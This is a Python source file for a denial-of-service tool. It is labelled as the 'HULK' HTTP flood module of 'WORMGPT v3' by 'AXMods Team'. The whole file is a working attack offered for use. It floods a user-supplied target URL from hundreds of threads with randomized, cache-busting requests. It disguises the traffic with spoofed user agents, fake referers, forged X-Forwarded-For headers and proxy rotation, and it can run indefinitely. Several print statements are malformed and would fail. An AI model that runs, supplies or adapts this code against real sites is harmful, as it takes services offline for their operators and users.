#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/hulk.py
HULK (HTTP Unbearable Load King) ATTACK MODULE - WORMGPT v3
High-Speed Request Variation Engine
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
import string
from urllib.parse import urlparse, quote

class HULKAttack:
    def __init__(self, target, port=80, threads=500, duration=0, proxy=False):
        """
        Initialize HULK Attack
        
        Args:
            target: Target URL
            port: Target port
            threads: Number of concurrent threads
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.threads = threads
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_threads = 0
        self.requests_sent = 0
        self.successful_requests = 0
        self.start_time = time.time()
        
        # Extensive user agent list
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; +http://mj12bot.com/)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
            'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)'
        ]
        
        # Referer list
        self.referers = [
            f"{self.parsed_url.scheme}://{self.host}/",
            f"{self.parsed_url.scheme}://{self.host}/index.php",
            f"{self.parsed_url.scheme}://{self.host}/home",
            "https://www.google.com/search?q=" + quote(''.join(random.choices(string.ascii_lowercase, k=10))),
            "https://www.bing.com/search?q=" + quote(''.join(random.choices(string.ascii_lowercase, k=10))),
            "https://www.youtube.com/watch?v=" + ''.join(random.choices(string.ascii_letters + string.digits, k=11)),
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.reddit.com/",
            "https://www.github.com/",
            "https://www.amazon.com/",
            "https://stackoverflow.com/questions/"
        ]
        
        # Common file extensions
        self.extensions = [
            '', '.php', '.html', '.htm', '.asp', '.aspx', '.jsp', 
            '.js', '.css', '.jpg', '.png', '.gif', '.pdf', '.txt',
            '.xml', '.json', '.ico', '.svg', '.mp4', '.mp3'
        ]
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Lock for thread safety
        self.lock = threading.Lock()
        
        # Statistics
        self.stats = {
            'bytes_sent': 0,
            'last_update': time.time()
        }
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
    
    def create_socket(self):
        """Create and connect a socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # HTTPS proxy CONNECT
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                    connect_request += f"Host: {self.host}:{self.port}\r\n\r\n"
                    
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    
                    if b'200' not in response:
                        return None
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL for HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
            
        except:
            return None
    
    def generate_random_path(self):
        """Generate a random URL path"""
        # Random path depth (1-4 levels)
        depth = random.randint(1, 4)
        path_parts = []
        
        for _ in range(depth):
            # Random directory name
            dir_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 12)))
            path_parts.append(dir_name)
        
        # Random filename
        file_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 15)))
        extension = random.choice(self.extensions)
        
        path_parts.append(file_name + extension)
        
        # Build path
        path = '/' + '/'.join(path_parts)
        
        # Add query parameters 70% of the time
        if random.random() > 0.3:
            num_params = random.randint(1, 5)
            params = []
            
            for i in range(num_params):
                param_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))
                param_value = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=random.randint(1, 20)))
                params.append(f"{param_name}={quote(param_value)}")
            
            path += '?' + '&'.join(params)
        
        return path
    
    def generate_random_headers(self, method):
        """Generate random HTTP headers"""
        path = self.generate_random_path()
        
        # Choose HTTP method
        if method == 'RANDOM':
            method = random.choice(['GET', 'POST', 'HEAD', 'PUT', 'DELETE'])
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Accept: {self.generate_accept_header()}",
            f"Accept-Language: {self.generate_accept_language()}",
            f"Accept-Encoding: gzip, deflate, br",
            f"Connection: {'keep-alive' if random.random() > 0.3 else 'close'}",
            f"Cache-Control: {self.generate_cache_control()}",
            f"Referer: {random.choice(self.referers)}",
            f"Upgrade-Insecure-Requests: 1"
        ]
        
        # Add additional headers randomly
        if random.random() > 0.5:
            headers.append(f"X-Forwarded-For: {self.generate_random_ip()}")
        
        if random.random() > 0.6:
            headers.append(f"X-Real-IP: {self.generate_random_ip()}")
        
        if random.random() > 0.7:
            headers.append("X-Requested-With: XMLHttpRequest")
        
        if random.random() > 0.8:
            headers.append(f"X-CSRF-Token: {self.generate_random_token()}")
        
        # Add cookie sometimes
        if random.random() > 0.4:
            headers.append(f"Cookie: {self.generate_random_cookie()}")
        
        # For POST requests, add content
        if method == 'POST':
            content = self.generate_post_content()
            headers.append("Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {len(content)}")
            headers.append("\r\n")
            headers.append(content)
        else:
            headers.append("\r\n")
        
        return '\r\n'.join(headers)
    
    def generate_accept_header(self):
        """Generate random Accept header"""
        accept_types = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "application/json, text/javascript, */*; q=0.01",
            "text/html, */*; q=0.01"
        ]
        return random.choice(accept_types)
    
    def generate_accept_language(self):
        """Generate random Accept-Language header"""
        languages = [
            "en-US,en;q=0.5",
            "en-GB,en;q=0.5",
            "en-CA,en;q=0.5",
            "en-AU,en;q=0.5",
            "de-DE,de;q=0.5",
            "fr-FR,fr;q=0.5",
            "es-ES,es;q=0.5",
            "ja-JP,ja;q=0.5",
            "zh-CN,zh;q=0.5"
        ]
        return random.choice(languages)
    
    def generate_cache_control(self):
        """Generate random Cache-Control header"""
        cache_controls = [
            "no-cache",
            "max-age=0",
            "no-store",
            "must-revalidate",
            "private"
        ]
        return random.choice(cache_controls)
    
    def generate_random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def generate_random_token(self):
        """Generate random token"""
        return ''.join(random.choices(string.hexdigits, k=32))
    
    def generate_random_cookie(self):
        """Generate random cookie"""
        cookie_names = ['sessionid', 'csrftoken', 'auth_token', 'user_id', 'visitor_id']
        cookie_name = random.choice(cookie_names)
        cookie_value = ''.join(random.choices(string.hexdigits, k=random.randint(16, 64)))
        return f"{cookie_name}={cookie_value}"
    
    def generate_post_content(self):
        """Generate POST content"""
        num_fields = random.randint(3, 8)
        fields = []
        
        for _ in range(num_fields):
            field_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 12)))
            field_value = ''.join(random.choices(string.ascii_letters + string.digits + ' -_', k=random.randint(5, 50)))
            fields.append(f"{field_name}={quote(field_value)}")
        
        return '&'.join(fields)
    
    def attack_thread(self, thread_id):
        """HULK attack thread"""
        with self.lock:
            self.active_threads += 1
        
        sockets_created = 0
        
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Create new socket for each request
            sock = self.create_socket()
            if sock is None:
                time.sleep(0.1)
                continue
            
            sockets_created += 1
            
            try:
                # Generate and send request
                request = self.generate_random_headers('RANDOM')
                bytes_sent = sock.send(request.encode())
                
                # Update statistics
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += bytes_sent
                
                # Try to receive response (non-blocking)
                sock.settimeout(1)
                try:
                    response = sock.recv(1024)
                    if response:
                        with self.lock:
                            self.successful_requests += 1
                except:
                    pass
                
                sock.close()
                
                # Add small random delay
                if random.random() > 0.9:
                    time.sleep(random.uniform(0.001, 0.01))
                    
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
            
            # Re-create socket every 50-100 requests to avoid connection issues
            if sockets_created > random.randint(50, 100):
                sockets_created = 0
                time.sleep(0.5)
        
        with self.lock:
            self.active_threads -= 1
    
    def monitor_attack(self):
        """Monitor attack progress"""
        print(f"\n[+] HULK Attack Started")
        print(f"[+] Target: {self.target}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds")
        print(f"[+] Proxy Mode: {'Enabled' if self.use_proxy and self.proxies else 'Disabled'}")
        print(f("[+] Strategy: Randomized HTTP requests with no cache patterns"))
        print(f"[+] Press Ctrl+C to stop\n")
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            
            if self.duration > 0 and elapsed >= self.duration:
                break
            
            with self.lock:
                requests = self.requests_sent
                successful = self.successful_requests
                active = self.active_threads
                bytes_sent = self.stats['bytes_sent']
            
            if elapsed > 0:
                rps = requests / elapsed
                success_rate = (successful / requests * 100) if requests > 0 else 0
                mb_sent = bytes_sent / (1024 * 1024)
            else:
                rps = 0
                success_rate = 0
                mb_sent = 0
            
            sys.stdout.write(f"\r[+] Threads: {active}/{self.threads} | "
                           f"Requests: {requests} | "
                           f"RPS: {rps:.1f} | "
                           f"Success: {success_rate:.1f}% | "
                           f"Data: {mb_sent:.2f} MB | "
                           f"Time: {elapsed:.1f}s")
            sys.stdout.flush()
            
            time.sleep(0.5)
    
    def start(self):
        """Start HULK attack"""
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start attack threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # Stagger thread creation
            if i % 100 == 0:
                time.sleep(0.1)
        
        # Wait for completion
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopping HULK attack...")
        
        # Cleanup
        self.is_attacking = False
        time.sleep(2)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        
        print(f"\n\n{'═'*70}")
        print(f"HULK ATTACK COMPLETED")
        print(f"{'═'*70}")
        print(f"Target: {self.target}")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Total Threads: {self.threads}")
        print(f"Total Requests: {self.requests_sent}")
        print(f"Successful Requests: {self.successful_requests}")
        print(f"Success Rate: {(self.successful_requests/self.requests_sent*100) if self.requests_sent > 0 else 0:.1f}%")
        print(f"Requests Per Second: {self.requests_sent/elapsed if elapsed > 0 else 0:.1f}")
        print(f"Data Sent: {self.stats['bytes_sent']/(1024*1024):.2f} MB")
        print(f"{'═'*70}")
        
        return {
            'duration': elapsed,
            'total_requests': self.requests_sent,
            'successful_requests': self.successful_requests,
            'bytes_sent': self.stats['bytes_sent'],
            'attack_type': 'HULK (HTTP Unbearable Load King)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════════╗
║         HULK ATTACK MODULE - WORMGPT v3         ║
║     HTTP Unbearable Load King - AXMods Team     ║
╚══════════════════════════════════════════════════╝
    """)
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    # Get parameters
    try:
        threads = int(input("[?] Number of threads (100-5000, default 500): ") or "500")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
        
        # HULK specific options
        print(f"\n[+] HULK Attack Options:")
        print(f("[+] 1. Standard Mode (Recommended)"))
        print(f("[+] 2. Aggressive Mode (More variations)"))
        
        mode = input("[?] Select mode (1-2, default 1): ") or "1"
        
        if mode == "2":
            print(f("[+] Aggressive Mode Activated - Maximum variation"))
        
    except Exception as e:
        print(f"[!] Invalid input: {e}, using defaults")
        threads = 500
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = HULKAttack(target, port, threads, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
